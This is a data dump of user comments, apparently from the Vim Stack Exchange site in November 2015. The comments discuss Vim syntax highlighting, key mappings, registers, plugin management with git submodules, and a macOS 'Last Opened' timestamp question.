  <row Id="8305" PostId="5394" Score="0" Text="@1.61803 One would think, but a little experimenting shows that's not the case, at least on Snow Leopard and Yosemite. If you open a file from the Finder, Last Opened is updated, but if you just do something like `cat` it, `stat` reports the access time is updated (as expected), but a Get Info doesn't show an updated Last Opened. I don't know where the Last Opened time is stored nor any way to get it except in Get Info." CreationDate="2015-11-08T18:14:45.640" UserId="4620" />
  <row Id="8306" PostId="5400" Score="0" Text="I'm glad it helped you. If the package name includes the zero but not the version reported inside your program, it's a bit misleading, I agree with you." CreationDate="2015-11-08T18:23:12.363" UserId="4939" />
  <row Id="8307" PostId="5406" Score="0" Text="@muru I fixed `/usr/share/vim/vim73/ftplugin/markdown.vim`, as I seemingly do not have a `vim74` directory there, but removing the offending line does nothing for me. And yes, they are not unrelated, but in my opinion it is a bit of a surprise that they should be so tightly coupled." CreationDate="2015-11-08T18:34:14.820" UserId="1066" />
  <row Id="8308" PostId="5406" Score="0" Text="Ah, I see the correct file to edit is in `/usr/local/share/vim/vim74/ftplugin/markdown.vim` since I compiled vim myself with `/usr/local` prefix. When changing that file, it works." CreationDate="2015-11-08T18:36:36.310" UserId="1066" />
  <row Id="8309" PostId="5406" Score="0" Text="@oarfish Run `:scriptnames` after opening a markdown file. You can find out if other runtime directories are being used. (The list might be long, so you could filter out stuff by comparing against the output after just opening Vim.)" CreationDate="2015-11-08T18:36:58.907" UserId="205" />
  <row Id="8310" PostId="5406" Score="0" Text="@oarfish excellent. I suppose that's your answer. I should have suggested `:e $VIMRUNTIME/ftplugin/markdown.vim`, instead of assuming things about your installation." CreationDate="2015-11-08T18:39:36.843" UserId="205" />
  <row Id="8311" PostId="5407" Score="0" Text="Yeah, but I need to use html entities in html, while they won't be correctly displayed in markdown. So my only option would be to drop the mappings which are very useful when edition html." CreationDate="2015-11-08T18:44:30.393" UserId="1066" />
  <row Id="8312" PostId="5374" Score="0" Text="@Emma try: `vim +g/word/d +'w bar' +q! foo`, where `foo` is the original file and `bar` is the target file, and `word` is the filtering word. What happens?" CreationDate="2015-11-08T18:51:02.137" UserId="205" />
  <row Id="8313" PostId="5408" Score="1" Text="How about just `:echo search('pattern', 'nw') ? 1 : 0` instead ? :)" CreationDate="2015-11-08T20:57:42.260" UserId="1800" />
  <row Id="8314" PostId="5408" Score="0" Text="Because if an occurrence of hello is before the cursor, then it won't be detected." CreationDate="2015-11-08T20:59:01.467" UserId="865" />
  <row Id="8315" PostId="5408" Score="0" Text="The 'w' flag will wrap the search around the end of the file though. So any occurrence will be detected." CreationDate="2015-11-08T21:00:08.887" UserId="1800" />
  <row Id="8316" PostId="5408" Score="1" Text="That is a very nice solution!  I was trying to demonstrate the setting of the cursor position for searching within ranges, but I guess I didn't choose the best example.  I have updated the example." CreationDate="2015-11-08T21:21:47.520" UserId="865" />
  <row Id="8317" PostId="5411" Score="0" Text="For simply checking if something exists in the buffer, this is the best way of doing it." CreationDate="2015-11-08T22:03:22.303" UserId="865" />
  <row Id="8318" PostId="5405" Score="0" Text="I don't think this answer is right, as it deletes the last `a` in each row for me." CreationDate="2015-11-08T22:08:52.187" UserId="3282" />
  <row Id="8319" PostId="5394" Score="0" Text="`mdls --name kMDItemLastUsedDate foobar` gets it, but I still haven't found a way to set Last Opened, maybe there's some other OS X specific command to achieve that." CreationDate="2015-11-09T00:57:36.227" UserId="4432" />
  <row Id="8321" PostId="5410" Score="0" Text="great answer! I was sure that `PluginInstall` loads `.vimrc` on it's own each time i'm running it. Thank you for clarification." CreationDate="2015-11-09T08:14:33.783" UserId="5165" />
  <row Id="8322" PostId="5405" Score="0" Text="Hah, you're right :) But the idea is still the same - just do it in the other direction, and 'prepend' to the line using `P`." CreationDate="2015-11-09T09:44:33.800" UserId="1800" />
  <row Id="8323" PostId="5359" Score="0" Text="Ok, thanks for explanation!" CreationDate="2015-11-09T10:02:54.397" UserId="2725" />
  <row Id="8324" PostId="5417" Score="0" Text="just added those lines and the result is that for autocompletion I need to use CTRL+Space (Jedi), and if I use TAB it adds a TAB (well, 4 whitespaces). I'm excepting to use TAB and get the same output I get using CTRL+Space (i.e. Jedi's output)" CreationDate="2015-11-09T11:49:27.307" UserDisplayName="user5235" />
  <row Id="8325" PostId="5418" Score="0" Text="Which language is this? Perhaps there's already a syntax file floating around somewhere?" CreationDate="2015-11-09T13:48:28.520" UserId="51" />
  <row Id="8326" PostId="5418" Score="0" Text="In this case, it is the Structure Control Language (SCL) for Siemens S7 PLC. But I have met a similar problem, for example for modelica." CreationDate="2015-11-09T13:55:46.593" UserId="2170" />
  <row Id="8327" PostId="5415" Score="1" Text="In addition to `filetype indent`, the settings of `fo` (formatoption) modifies vims indent behaviour. I would check the settings with `:set fo?`" CreationDate="2015-11-09T13:57:12.883" UserId="4603" />
  <row Id="8328" PostId="5056" Score="0" Text="@garyjohn This is the solution I found most helpful (automatically loads the functions and ties them to that specific session). If you add it as answer I'll gladly accept it" CreationDate="2015-11-09T18:58:52.563" UserId="1166" />
  <row Id="8329" PostId="5125" Score="0" Text="If my functions were more general use, this would be good, but they've all been very session specific so far. Good idea to keep in mind though." CreationDate="2015-11-09T19:00:04.817" UserId="1166" />
  <row Id="8331" PostId="5431" Score="2" Text="They are not added because those directories are already a repository of their own. The best way that I found for adding the plugins on my git repository is using `submodules`. you may look at this [screencast](http://vimcasts.org/episodes/synchronizing-plugins-with-git-submodules-and-pathogen)" CreationDate="2015-11-10T14:08:30.330" UserId="1453" />
  <row Id="8332" PostId="5431" Score="0" Text="`gitignore` file maybe? In any case, not really a Vim question... We have [one such question](http://vi.stackexchange.com/questions/543/github-for-vimrc-and-plugins) for general tips &amp; hints on using git with vim init files, if you're having troubles with git, you should ask this on Stack Overflow. I've closed this question rather than migrating it to SO, as it doesn't contain enough information to give a meaningful answer (and would likely be closed on SO). Add some information like the directory structure, output of `git status`, etc. and I can migrate it." CreationDate="2015-11-10T14:14:43.037" UserId="51" />
  <row Id="8334" PostId="5203" Score="0" Text="Why the `if` statement? If I leave it in, the autocmds are not executed for me." CreationDate="2015-11-10T14:28:01.727" UserId="1066" />
  <row Id="8335" PostId="5203" Score="0" Text="@oarfish even if you restart Vim?" CreationDate="2015-11-10T15:05:30.873" UserId="1405" />
  <row Id="8336" PostId="5203" Score="0" Text="Ok, this is weird. I have to `au!` statements in the group, namely `au! BufRead,BufNewFile *.py        setfiletype python` and in the line below&#xA;`au! BufRead,BufNewFile *.tpp       setfiletype cpp`. But only the second one actually works. Editing `.py` files does not set the file type to `python`. I'm not exactly a vim-guru so I'm probably missing something." CreationDate="2015-11-10T15:11:58.077" UserId="1066" />
  <row Id="8337" PostId="5203" Score="0" Text="@oarfish if you check the file I mentioned on the edit you will find that it already contains a line with `au BufNewFile,BufRead *.py,*.pyw		setf python`, so your first line is irrelevant. Your problem is probably elsewhere." CreationDate="2015-11-10T15:16:12.730" UserId="1405" />
  <row Id="8338" PostId="5203" Score="0" Text="`&quot;Editing .py files does not set the file type to python&quot;` - what is the output of `:set ft` on that case? If it is not python, try following the procedure in [Vim-FAQ 2.5 - I have a &quot;xyz&quot; (some) problem with Vim](http://vimhelp.appspot.com/vim_faq.txt.html#faq-2.5)" CreationDate="2015-11-10T15:20:31.047" UserId="1405" />
  <row Id="8339" PostId="5203" Score="0" Text="Found the error! From some ancient time of vim noobism I head a `~/.vim/ftdetect/py.vim` file which set the filetype incorrectly. Removed it and it works." CreationDate="2015-11-10T15:21:52.147" UserId="1066" />
  <row Id="8340" PostId="5431" Score="0" Text="@Carpetsmoker you can close it if you want, I decided to use the submodule method to track them as its seem to be the most efficiency way. Thanks vappolinario, I was watching that screencast before but didn't understand it the first time but now it makes sense." CreationDate="2015-11-10T16:05:11.553" UserId="2129" />
  <row Id="8341" PostId="5434" Score="1" Text="I don't know if it answers your question, but there's a vim plugin called syntastic that can run your file through an external syntax checker and displays the errors it has detected : https://github.com/scrooloose/syntastic" CreationDate="2015-11-10T22:05:27.127" UserId="4939" />
  <row Id="8342" PostId="5437" Score="4" Text="Vim golf: `qqyypW&lt;c-a&gt;q135@q`. Even shorter if you use `Y` instead of `yy`." CreationDate="2015-11-11T00:16:54.843" UserId="778" />
  <row Id="8343" PostId="5435" Score="2" Text="[Shellcheck](https://github.com/koalaman/shellcheck) is a lot more useful for detecting problems than `sh -n`, and it's supported by syntastic." CreationDate="2015-11-11T06:07:46.480" UserId="1577" />
  <row Id="8344" PostId="5435" Score="0" Text="@lcd047 Thanks for the tip. I hope the AUR script for that doesn't make me build it. Haskell programs scare me these days." CreationDate="2015-11-11T06:09:44.140" UserId="205" />
  <row Id="8345" PostId="5435" Score="0" Text="They should.  Oh yes, they should. :)" CreationDate="2015-11-11T06:16:32.047" UserId="1577" />
  <row Id="8346" PostId="5441" Score="2" Text="The flip side: location-based grouping instead of filetype-based. See http://vi.stackexchange.com/q/77/205" CreationDate="2015-11-11T09:26:20.370" UserId="205" />
  <row Id="8347" PostId="5443" Score="0" Text="Nice, I already have this! But never really had a close look. So, I pumped up vimrc.  What about settings that do not concern a specific filetype though?" CreationDate="2015-11-11T09:37:58.643" UserId="1963" />
  <row Id="8348" PostId="5441" Score="0" Text="Might the answer I am looking for be somethere among the lines in http://vi.stackexchange.com/a/3152/1963?  Source files which contain the settings I want for specific things I need?" CreationDate="2015-11-11T09:47:01.240" UserId="1963" />
  <row Id="8349" PostId="5442" Score="2" Text="Why don't you try [the troubleshooting on its wiki](https://github.com/begriffs/haskell-vim-now/wiki/Installation-Troubleshooting) or [the issue tracker](https://github.com/begriffs/haskell-vim-now/issues)?" CreationDate="2015-11-11T11:43:21.377" UserId="1405" />
  <row Id="8350" PostId="5437" Score="0" Text="You guys are ANIMALS! Thank you!" CreationDate="2015-11-11T14:53:46.570" UserId="5251" />
  <row Id="8351" PostId="5431" Score="0" Text="Is submodule really the most **efficient** method? What about vim-plug and/or Vundle? (In fact, vim-plug was chosen as the default method for plugin install in neovim, AFAIK)" CreationDate="2015-11-11T14:58:24.333" UserId="599" />
  <row Id="8352" PostId="5433" Score="0" Text="The `keyword LangKeys` part should not be required." CreationDate="2015-11-11T15:22:45.730" UserId="599" />
  <row Id="8353" PostId="5447" Score="0" Text="In my original problem I have to match more than a single number in the same line, and I just found out that `&quot;#\zs\d\+\ze#\zs\d\+\ze#&quot;` won't work. Do you know how to make multiple matches in the same line, or I should make another question?" CreationDate="2015-11-11T15:47:33.927" UserId="4963" />
  <row Id="8354" PostId="5447" Score="1" Text="Are all the matches part of the same match? (I.e. between the same set of `#` separators?) If yes, what separates the numbers? Rewrite the rule taking into account the possible sub-separators. If not, things should *already* work as is." CreationDate="2015-11-11T16:00:44.997" UserId="1800" />
  <row Id="8355" PostId="5447" Score="0" Text="I realized that my doubt is a whole new question, so I made one [here](http://vi.stackexchange.com/questions/5448/syntax-highlight-multiple-matches-in-the-same-line)." CreationDate="2015-11-11T16:22:34.537" UserId="4963" />
  <row Id="8356" PostId="5447" Score="0" Text="@Kira Vanlaser is right. keep in mind that `#123#456#` is `#123#` and `#456#` so the same cmd should work too." CreationDate="2015-11-11T16:23:25.637" UserId="1569" />
  <row Id="8358" PostId="5447" Score="0" Text="The problem is that this is not my actual problem, I've used a fictional example just for simplicity, check this [question](http://vi.stackexchange.com/questions/5448/syntax-highlight-multiple-matches-in-the-same-line) for something more specific." CreationDate="2015-11-11T16:25:38.223" UserId="4963" />
  <row Id="8360" PostId="5449" Score="0" Text="I did not make myself clear enough, please check the edited question." CreationDate="2015-11-11T16:35:04.153" UserId="4963" />
  <row Id="8361" PostId="5450" Score="0" Text="`let g:SuperTabContextDefaultCompletionType = &quot;&lt;c-x&gt;&lt;c-o&gt;&quot;`this did the trick!" CreationDate="2015-11-11T16:55:39.730" UserDisplayName="user5235" />
  <row Id="8362" PostId="5449" Score="1" Text="@Kira It is long time I haven't written syntax file. I have to test with your example. however I don't get time right now. But I think you need to use the `contains, contained and nextgroup`  check `:h syn-nextgroup` for detail, there is an example." CreationDate="2015-11-11T17:14:06.913" UserId="1569" />
  <row Id="8363" PostId="4825" Score="1" Text="Hey @Pak I way appreciate your answer.  You ought to accept (green checkmark) your own answer (to mark this thread as a solved question)!" CreationDate="2015-11-11T17:44:07.290" UserId="2221" />
  <row Id="8364" PostId="4825" Score="0" Text="Thanks for the reminder, @SuperScript.  I was planning on accepting it,but I think you have to wait few days (and then I forgot about it)." CreationDate="2015-11-11T18:44:40.927" UserId="1115" />
  <row Id="8365" PostId="5269" Score="0" Text="Actually, after further research this is theoretically possible by changing the default fallback font as asked [here](http://apple.stackexchange.com/questions/215245/how-to-change-default-fallback-font-for-non-latin-languages)" CreationDate="2015-11-11T19:24:05.503" UserId="5049" />
  <row Id="8366" PostId="5222" Score="0" Text="It could be related to what `$TERM` is reporting as well. If it is set incorrectly then `t_Co` might be set to a low number. In my terminal if `t_Co` is 8 or less, than all text is bold." CreationDate="2015-11-11T19:45:46.693" UserId="1402" />
  <row Id="8367" PostId="5443" Score="2" Text="You may need `:he autoload` and `:he source`?&#xA;Also check this answer http://stackoverflow.com/a/805242/1821490" CreationDate="2015-11-11T22:33:54.173" UserId="1145" />
  <row Id="8368" PostId="5431" Score="0" Text="@Vitor AFAIK to track it under source control under git using github and without having to maintain those particular plugins across multiple machine. I'm using pathogen for installing them, I'm not using neovim, I'm using standard terminal. When I did a pull from github and submodule init update, it grabs everything it needs and installs the other plugins from their respective repo, keeping my github repo lightweight." CreationDate="2015-11-12T00:28:05.487" UserId="2129" />
  <row Id="8370" PostId="5433" Score="0" Text="@Vitor, why not? I use them as matchgroup, and in my tests, without it, you would have `DO` highlighted, but `WHILE` and `ENd_WHILE` would take on the `transparent` feature..." CreationDate="2015-11-12T06:11:58.077" UserId="2170" />
  <row Id="8371" PostId="5435" Score="0" Text="Thanks for that. Indeed, finding an unmatched closing (like `fi`) is quite simple. However I still haven't seen how to get that middle `then` with a syntax file. I'll try the recommended plugins." CreationDate="2015-11-12T06:38:39.783" UserId="2170" />
  <row Id="8372" PostId="5443" Score="0" Text="@AlexKroll not for filetype plugins." CreationDate="2015-11-12T07:01:28.567" UserId="71" />
  <row Id="8373" PostId="5443" Score="0" Text="@ChristianBrabandt for everything you want. You can source any script in `.vimrc`. Just put `source my-funy-useful-script.vim` line in your `.vimrc` and Vim loads it after restarting( or `:so $MYVIMRC` command). &#xA;Also `:he writing-library-scripts` may helps you." CreationDate="2015-11-12T07:20:23.057" UserId="1145" />
  <row Id="8374" PostId="5435" Score="0" Text="@bilbo_pingouin oh, not that simple. Try a new shell script with just `an unmatched fi` in one line. Syntax highlighting in Vim is a messy business, it isn't powerful enough for a lot of things." CreationDate="2015-11-12T08:46:14.410" UserId="205" />
  <row Id="8375" PostId="5452" Score="0" Text="Could you teach us in the mean time? Someone *may* be able to help you from there." CreationDate="2015-11-12T09:12:29.317" UserId="54" />
  <row Id="8376" PostId="5435" Score="0" Text="@muru, well I made some syntax kind of [like that](http://pastebin.com/2wvgPdh9). And it seems to work alright. At least in what I tested so far.  But indeed no middle region tests." CreationDate="2015-11-12T09:49:06.003" UserId="2170" />
  <row Id="8377" PostId="5443" Score="0" Text="@AlexKroll I think this is closer to the answer I am looking for. Would you mind editing the current answer and expand it?  Or, make a separate answer?  I am not looking *only* for specific file types. I hope this is clear in my question." CreationDate="2015-11-12T10:19:34.817" UserId="1963" />
  <row Id="8378" PostId="5441" Score="0" Text="Removed the `filetype` tag -- for now maybe?  It makes readers think the questions is about specific file types, which is not the case." CreationDate="2015-11-12T10:27:42.857" UserId="1963" />
  <row Id="8379" PostId="5441" Score="0" Text="it seemed appropriate given the original question." CreationDate="2015-11-12T10:42:34.430" UserId="205" />
  <row Id="8380" PostId="5441" Score="0" Text="@muru Yes, no worries. We might add that later on as well. Thank you." CreationDate="2015-11-12T10:53:54.787" UserId="1963" />
  <row Id="8381" PostId="5456" Score="0" Text="You have LangKeys in your `matchgroup`, where do you define them?" CreationDate="2015-11-12T12:35:53.023" UserId="2170" />
  <row Id="8382" PostId="5456" Score="0" Text="The original question does not include highlight commands and it is said that it works, so I assume that there is no doubt regarding that part." CreationDate="2015-11-12T12:56:27.780" UserId="599" />
  <row Id="8383" PostId="5456" Score="0" Text="I don't think you understand what I want to say. Indeed the question does not specify highlighting. Nevertheless, in your example, you have `syn region LangBlock matchgroup=LangKeys ...`. I might be mistaken, but I think that this calls for another  `syn` line with `LangKeys` defined. Doesn't it?" CreationDate="2015-11-12T13:01:08.787" UserId="2170" />
  <row Id="8384" PostId="5456" Score="0" Text="It doesn't and I  explain that in my answer in the second point." CreationDate="2015-11-12T13:04:59.733" UserId="599" />
  <row Id="8385" PostId="5456" Score="0" Text="No, you don't really explain it. At least not clearly enough. So you could have `matchgroup=FooBar` instead, it would just work the same?" CreationDate="2015-11-12T13:08:08.393" UserId="2170" />
  <row Id="8386" PostId="5455" Score="1" Text="Yeah, you only need `&lt;Cr&gt;` in key mappings (`nnoremap` and friends). For autocmds, it's just a list of &quot;normal&quot; Vim commands. This can be a bit confusing, but does make sense: with a mapping, you want to replicate  keys a user might type; leaving of `&lt;Cr&gt;` for example can be quite useful. With autocmds, you just want to run some VimScript, not emulate what a user might type (although you could, with `:normal`)." CreationDate="2015-11-12T13:34:36.043" UserId="51" />
  <row Id="8387" PostId="5456" Score="0" Text="Yes, as long as you have a `:highlight` named FooBar, that would work perfectly." CreationDate="2015-11-12T14:06:03.963" UserId="599" />
  <row Id="8388" PostId="5452" Score="1" Text="Not sure what you mean. I typed English, Thai and Lao in the chrome address bar and then used alternate arrow on my mac and I was able to navigate at the word level in all three of these languages. The programs that I have mentioned are tapping into work that has already been done at some lower level. If vim could tap into the same work, then someone could edit a mutli-language document without having to do anything fancy. 'w' would just scroll happily from one word to the next regardless of the language." CreationDate="2015-11-12T14:54:48.217" UserId="5049" />
  <row Id="8389" PostId="5452" Score="1" Text="Line breaks are another issue. These languages space at the phrasal level and the spaces have meaning. So the trailing space or absence of a trailing space at the end of the line has meaning when breaking and joining lines. For purpose of example, the spaces are similar to an oxford comma and other punctuation and is the difference of whether or not we had Grandma for breakfast. (Let's eat Grandma. vs Let's eat, Grandma.)" CreationDate="2015-11-12T15:02:38.723" UserId="5049" />
  <row Id="8390" PostId="5456" Score="0" Text="Just noticed that you answered your own question :)" CreationDate="2015-11-12T15:03:54.853" UserId="599" />
  <row Id="8391" PostId="5456" Score="0" Text="I did, as I did not get any other answer and my system seems to be doing what I wanted." CreationDate="2015-11-12T15:10:59.693" UserId="2170" />
  <row Id="8392" PostId="5452" Score="0" Text="I meant &quot;tell us what the rules are if you want us to help you find a way to follow them&quot;. But I suspect this question is more appropriated to the vim_dev mailing list." CreationDate="2015-11-12T15:33:52.993" UserId="54" />
  <row Id="8393" PostId="5459" Score="1" Text="how to remove the sign once the `TODO` comment has been removed?" CreationDate="2015-11-12T16:39:50.710" UserDisplayName="user5235" />
  <row Id="8394" PostId="5459" Score="0" Text="To delete the sign, you can use this command :    `sign undefine todo`" CreationDate="2015-11-12T16:48:14.787" UserId="4939" />
  <row Id="8395" PostId="5452" Score="0" Text="What ever the rules are, they have already been written and are incorporated into all the major OSes such that most programs are able to tap into them. Unfortunately, I do not know what these rules are called, so that I do not know how to refer to them. // I have taken your advice, @romainl and have written the vim_dev mailing list. Currently waiting for the email to post. Thank you for getting me started in vim." CreationDate="2015-11-12T17:03:59.307" UserId="5049" />
  <row Id="8396" PostId="5459" Score="1" Text="that's not what I expected, because that remove all the `todo` signs, but however just noticed that removing the line the sign is removed, so that's ok" CreationDate="2015-11-12T17:06:04.933" UserDisplayName="user5235" />
  <row Id="8397" PostId="5459" Score="1" Text="Ok, I've added this line at the beginning of the function : `silent! sign undefine todo`. It deletes the sign todo if it already exists, so that if your signs are misplaced after deleting a line containing the keyword TODO or FIXME, you can recall the function to fix them immediately." CreationDate="2015-11-12T17:15:49.370" UserId="4939" />
  <row Id="8398" PostId="5457" Score="0" Text="Hello,  I installed emacs and it seems to work fine. Thanks anyway" CreationDate="2015-11-12T18:12:41.670" UserId="5255" />
  <row Id="8399" PostId="5452" Score="0" Text="Apparently my question to the vim_dev was not worthy as it has not posted. However, with more study, I have discovered that my version of vim was compiled with arabic and farsi enabled. How do I work with someone to develop a +thai option?" CreationDate="2015-11-12T18:51:27.550" UserId="5049" />
  <row Id="8400" PostId="5457" Score="6" Text="@lolveley I fail to see how that's a solution to getting Vim to work with haskell-vim-now." CreationDate="2015-11-12T19:02:21.767" UserId="15" />
  <row Id="8401" PostId="5459" Score="2" Text="The regex was wrong, I typed `^[TODO|FIXME]` but instead it should have been `\v(TODO|FIXME)`. The new regex will match a line containing one of the keywords but not the beginning of the line, since I suppose a line could contain some code before a comment for example like this `some code # FIXME this line needs to be fixed`. The previous regex was completely wrong, sorry for the inconvenience, I'm still learning vimscript..." CreationDate="2015-11-12T21:02:47.427" UserId="4939" />
  <row Id="8402" PostId="3971" Score="0" Text="I like the last one, but for some reasons it doesn't work I get an error `expected function name`. vimL is too cryptic to me to understand it." CreationDate="2015-11-13T05:08:43.740" UserId="5290" />
  <row Id="8403" PostId="5463" Score="1" Text="Sweet! :D works nicely  - I had never come across the `@*` before, thanks!" CreationDate="2015-11-13T11:12:06.710" UserId="4603" />
  <row Id="8404" PostId="5463" Score="0" Text="I'm glad it helped you. I've edited the answer to propose another solution." CreationDate="2015-11-13T11:20:23.193" UserId="4939" />
  <row Id="8405" PostId="5463" Score="1" Text="nice one, I tried your suggestion about using  `: &lt;C-r&gt;a`  it actually worked fine too :) I guess vim read the `^M`'s as line returns - and executed each one as its own individual line / command?" CreationDate="2015-11-13T11:54:24.270" UserId="4603" />
  <row Id="8406" PostId="5463" Score="0" Text="That's a good question, honestly I don't know. Usually if I don't delete this character I've got errors. I'm glad it worked for you without errors. Maybe someone with more knowledge on the subject will explain to us how vim treats that kind of special characters." CreationDate="2015-11-13T12:06:17.903" UserId="4939" />
  <row Id="8407" PostId="5464" Score="3" Text="In which registers does the plugin store your blocks of code ? I don't know if it solves your problem, but let's say the 3 registers a, b and c contain data that you want to merge into the register d. To do so, you can type `let @d=@a.@b.@c`. The dot is an operator that concatenates strings." CreationDate="2015-11-13T14:00:25.347" UserId="4939" />
  <row Id="8410" PostId="5464" Score="0" Text="saginaw: Didn’t know that, nice. Thanks! But it doesn’t *really* solve my problem because I have like 20 blocks to yank." CreationDate="2015-11-13T16:49:40.477" UserId="5045" />
  <row Id="8411" PostId="5469" Score="1" Text="How about running `%s/σ\&gt;/ς/g` whenever you save the file?" CreationDate="2015-11-13T17:58:40.430" UserId="205" />
  <row Id="8412" PostId="5469" Score="0" Text="Yes, but it would be better to have it corrected straight away." CreationDate="2015-11-13T18:09:28.767" UserId="4505" />
  <row Id="8413" PostId="5469" Score="1" Text="It's even better to *write* it correctly from the start :P You could use (greek) dictionary-based [autocompletion](http://vim.wikia.com/wiki/Dictionary_completions)" CreationDate="2015-11-13T18:10:36.490" UserId="1800" />
  <row Id="8414" PostId="5469" Score="1" Text="The problem is distinguishing an end-of-word sigma from a normal one. I think you'll have to content yourself with typing some other key combination at the end of word (say `inoremap σ&lt;spac&gt; ς`), then any sigma followed by space will be replaced by the other form. But then you'd have to add another space manually." CreationDate="2015-11-13T18:16:30.773" UserId="205" />
  <row Id="8415" PostId="5471" Score="0" Text="Work harder at understanding `containedin`.  Add a pattern for `A11B453`, then make the `[AB]\zs\d\+\ze` contained in it." CreationDate="2015-11-13T18:34:52.207" UserId="2313" />
  <row Id="8416" PostId="5471" Score="0" Text="I did that also, this violates the condition of not removing the previous highlighting from A and B." CreationDate="2015-11-13T18:36:42.793" UserId="4963" />
  <row Id="8417" PostId="5471" Score="0" Text="... Which is why you make the pattern transparent." CreationDate="2015-11-13T19:32:38.293" UserId="2313" />
  <row Id="8418" PostId="5472" Score="0" Text="Nope, this still highlights all `A=number` and `B=number`.  You have to use `contained`, not just `contains`.  And you can safely forget about `containedin`." CreationDate="2015-11-13T20:05:05.487" UserId="2313" />
  <row Id="8419" PostId="5472" Score="0" Text="Right, I've added the `contained` part." CreationDate="2015-11-13T20:21:13.197" UserId="4963" />
  <row Id="8420" PostId="5472" Score="0" Text="Yes: without `contained` the `num` pattern is also matched at top level." CreationDate="2015-11-13T20:23:14.810" UserId="2313" />
  <row Id="8421" PostId="5459" Score="1" Text="The problem with this approach is, it will get quikly out of sync, if you modify the buffer, e.g. add another line above a TODO line." CreationDate="2015-11-14T10:20:11.257" UserId="71" />
  <row Id="8422" PostId="5459" Score="0" Text="Yes, you're right. Your plugin is probably much better because it's dynamic, that's why I upvoted your answer. Besides my function should not `undefine` but `unplace` because the help says &quot;If signs with this {name} are still placed this will cause trouble.&quot;. Unfortunately, when I tried to use `unplace` in the function, it didn't work. Anyway, that was just my attempt at solving the problem on my own." CreationDate="2015-11-14T10:31:24.903" UserId="4939" />
  <row Id="8425" PostId="5464" Score="2" Text="I don't know how your plugin works, but here's how I would do it without the plugin.&#xA;&#xA;Add a mapping in my `~/.vimrc` that maps `&lt;leader&gt;c` to `&quot;Ay` in visual mode, which gives : `vnoremap &lt;leader&gt;c &quot;Ay`. Then, in vim clear the register `a` : `let @a=&quot;&quot;`. Then, visually select first block of code and type `&lt;leader&gt;c`, go to second block of code, visually select it and type `&lt;leader&gt;c`, etc. When I'm finished and I want to paste the concatenated blocks, I would type in normal mode `&quot;ap`." CreationDate="2015-11-14T11:17:50.653" UserId="4939" />
  <row Id="8426" PostId="5464" Score="1" Text="Just to explain, when you use `&quot;ay` on a visually selected text, the text overwrites the content of the register `a`, but when you use the capital letter instead of the lower one, it appends to the register instead of overwriting it." CreationDate="2015-11-14T11:18:31.283" UserId="4939" />
  <row Id="8427" PostId="5464" Score="0" Text="@saginaw Thanks. You could make this into an answer. (I haven’t tried it yet, but I understand that it will work.)" CreationDate="2015-11-14T12:12:09.187" UserId="5045" />
  <row Id="8428" PostId="5474" Score="1" Text="Yes, this works. Thanks! (About that I am the one who should know how to do it: Maybe, but in this case, I think, it’s less about the plugin and more about the logic of vim itself.)" CreationDate="2015-11-14T12:14:51.493" UserId="5045" />
  <row Id="8429" PostId="5474" Score="2" Text="You're welcome! :)" CreationDate="2015-11-14T12:16:02.193" UserId="1800" />
  <row Id="8430" PostId="5470" Score="1" Text="You might have an extra space character after the `nnoremap / 2`. If so, you're basically moving 2 spaces to the right, since `:h &lt;Space&gt;` states that it is equivalent to `l` (move &quot;`[count]` chars to the right&quot;). Alway use the `*noremap` form, unless you know you need recursive mappings." CreationDate="2015-11-14T14:13:31.520" UserId="1800" />
  <row Id="8431" PostId="5459" Score="0" Text="@saginaw thanks!" CreationDate="2015-11-14T18:52:47.617" UserId="71" />
  <row Id="8432" PostId="5478" Score="1" Text="no, it's not about moving the text. It's about moving the visual selection." CreationDate="2015-11-14T19:43:30.230" UserId="1881" />
  <row Id="8433" PostId="5477" Score="1" Text="Would you seriously advise someone to do this?" CreationDate="2015-11-14T20:12:25.427" UserId="5139" />
  <row Id="8434" PostId="5477" Score="1" Text="@Baruchel: The question was, &quot;Could this be done?&quot; The answer is &quot;yes&quot;. Whether someone finds it useful is up to them. It's not a great idea, but it's not harmful, either." CreationDate="2015-11-14T20:41:17.787" UserId="2055" />
  <row Id="8435" PostId="5479" Score="0" Text="At first I thought this answer was wrong, since IPC without X is not just possible, but also very common (eg. sockets). But `:help x11-clientserver` seems to confirm it: &quot;The communication between client and server goes through the X server. [..] A non GUI Vim with access to the X11 display (|xterm-clipboard| enabled), can also act as a command server if a server name is explicitly given&quot; ..." CreationDate="2015-11-14T23:03:22.747" UserId="51" />
  <row Id="8436" PostId="5480" Score="0" Text="Could you please give an example of what you did in your answer and why it works?" CreationDate="2015-11-14T23:33:59.027" UserId="865" />
  <row Id="8437" PostId="5468" Score="0" Text="Thank you very much for your answer and the detailed comments. As you mentioned, your solution doesn't always work, but it often does. I want a solution which works all the time, so I created one using Python myself. Nevertheless I appreciate the effort you put in this answer a lot, therefore I am going to accept your answer :) I think it is funny to see that you used way less code lines with VimL than I did with Python." CreationDate="2015-11-15T02:26:04.590" UserId="3282" />
  <row Id="8438" PostId="5468" Score="1" Text="If you reliably want to determine if a line begins with a comment character, just append a new line with some text to the buffer and comment it out. Read it back in and you know how your comment looks like." CreationDate="2015-11-15T02:39:06.610" UserId="3282" />
  <row Id="8440" PostId="5468" Score="0" Text="Thank you very much for accepting my answer and for the solution to the problem of recognizing a comment character. I modified the code. No need of the `:Vb` command anymore, no dirty hack with the `@` character anymore, and the comment character should be properly detected now (thanks to your idea). I would like to help you review your code, but I don't know Python, so I can't. Thanks for this question, it was a great way to learn a bit more about VimL." CreationDate="2015-11-15T05:17:34.960" UserId="4939" />
  <row Id="8442" PostId="5302" Score="0" Text="What is your thinking in using \@! here? I admit I don't know what this is supposed to do, but it's interesting!" CreationDate="2015-11-15T08:52:14.197" UserId="5089" />
  <row Id="8443" PostId="5303" Score="0" Text="Having the pattern just once is a plus. I got it working after what looks like correcting a misunderstanding, because bla is just the start of the line. `/\(\nbla.*\)\+\zs/;4,5m.`" CreationDate="2015-11-15T08:58:08.277" UserId="5089" />
  <row Id="8444" PostId="5468" Score="0" Text="You should accept your answer as the right one. Mine still needs a lot of modifications. Plus you will get more chance to get help for your code because your post will appear on top. I will then delete my answer, and maybe ask for help on another topic." CreationDate="2015-11-15T09:01:08.210" UserId="4939" />
  <row Id="8445" PostId="5303" Score="0" Text="I also like learning that I can move the cursor with `;`." CreationDate="2015-11-15T09:10:47.547" UserId="5089" />
